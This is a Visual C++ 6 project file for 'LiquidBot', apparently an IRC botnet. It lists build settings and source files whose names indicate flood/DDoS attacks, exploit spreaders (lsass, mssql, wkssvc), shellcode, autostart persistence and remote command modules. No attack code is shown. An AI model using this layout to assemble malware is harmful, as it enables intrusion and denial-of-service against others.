# Microsoft Developer Studio Project File - Name="LiquidBot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=LiquidBot - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "LiquidBot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "LiquidBot.mak" CFG="LiquidBot - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "LiquidBot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "LiquidBot - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "LiquidBot - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x407 /d "NDEBUG"
# ADD RSC /l 0x407 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386

!ELSEIF  "$(CFG)" == "LiquidBot - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x407 /d "_DEBUG"
# ADD RSC /l 0x407 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept

!ENDIF 

# Begin Target

# Name "LiquidBot - Win32 Release"
# Name "LiquidBot - Win32 Debug"
# Begin Group "Quellcodedateien"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\source\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\source\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\source\allx.cpp
# End Source File
# Begin Source File

SOURCE=.\source\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\source\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\source\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\source\download.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\source\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\source\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\source\kelvir.cpp
# End Source File
# Begin Source File

SOURCE=.\source\Liquid.cpp
# End Source File
# Begin Source File

SOURCE=.\source\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\source\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\lsass2.cpp
# End Source File
# Begin Source File

SOURCE=.\source\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\source\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ntpass.cpp

!IF  "$(CFG)" == "LiquidBot - Win32 Release"

!ELSEIF  "$(CFG)" == "LiquidBot - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\source\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\source\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\source\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\source\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\source\skysyn.cpp
# End Source File
# Begin Source File

SOURCE=.\source\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\tcpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\source\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\source\wildcard.cpp
# End Source File
# Begin Source File

SOURCE=.\source\wins.cpp
# End Source File
# Begin Source File

SOURCE=.\source\wkssvc.cpp
# End Source File
# End Group
# Begin Group "Header-Dateien"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\header\advscan.h
# End Source File
# Begin Source File

SOURCE=.\header\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\header\ALLX.h
# End Source File
# Begin Source File

SOURCE=.\header\autostart.h
# End Source File
# Begin Source File

SOURCE=.\header\configs.h
# End Source File
# Begin Source File

SOURCE=.\header\crc32.h
# End Source File
# Begin Source File

SOURCE=.\header\crypt.h
# End Source File
# Begin Source File

SOURCE=.\header\ddos.h
# End Source File
# Begin Source File

SOURCE=.\header\defines.h
# End Source File
# Begin Source File

SOURCE=.\header\download.h
# End Source File
# Begin Source File

SOURCE=.\header\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\header\externs.h
# End Source File
# Begin Source File

SOURCE=.\header\fphost.h
# End Source File
# Begin Source File

SOURCE=.\header\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\header\functions.h
# End Source File
# Begin Source File

SOURCE=.\header\globals.h
# End Source File
# Begin Source File

SOURCE=.\header\httpd.h
# End Source File
# Begin Source File

SOURCE=.\header\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\header\ident.h
# End Source File
# Begin Source File

SOURCE=.\header\includes.h
# End Source File
# Begin Source File

SOURCE=.\header\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\header\kelvir.h
# End Source File
# Begin Source File

SOURCE=.\header\Liquid.h
# End Source File
# Begin Source File

SOURCE=.\header\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\header\lsass.h
# End Source File
# Begin Source File

SOURCE=.\header\lsass2.h
# End Source File
# Begin Source File

SOURCE=.\header\misc.h
# End Source File
# Begin Source File

SOURCE=.\header\mssql.h
# End Source File
# Begin Source File

SOURCE=.\header\netutils.h
# End Source File
# Begin Source File

SOURCE=.\header\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\header\ntpass.h

!IF  "$(CFG)" == "LiquidBot - Win32 Release"

# PROP Exclude_From_Build 1

!ELSEIF  "$(CFG)" == "LiquidBot - Win32 Debug"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\header\passwd.h
# End Source File
# Begin Source File

SOURCE=.\header\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\header\redirect.h
# End Source File
# Begin Source File

SOURCE=.\header\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\header\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\header\scan.h
# End Source File
# Begin Source File

SOURCE=.\header\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\header\skysyn.h
# End Source File
# Begin Source File

SOURCE=.\header\synflood.h
# End Source File
# Begin Source File

SOURCE=.\header\tcpflood.h
# End Source File
# Begin Source File

SOURCE=.\header\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\header\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\header\threads.h
# End Source File
# Begin Source File

SOURCE=.\header\visit.h
# End Source File
# Begin Source File

SOURCE=.\header\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\header\wins.h
# End Source File
# Begin Source File

SOURCE=.\header\wkssvc.h
# End Source File
# End Group
# Begin Group "Ressourcendateien"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
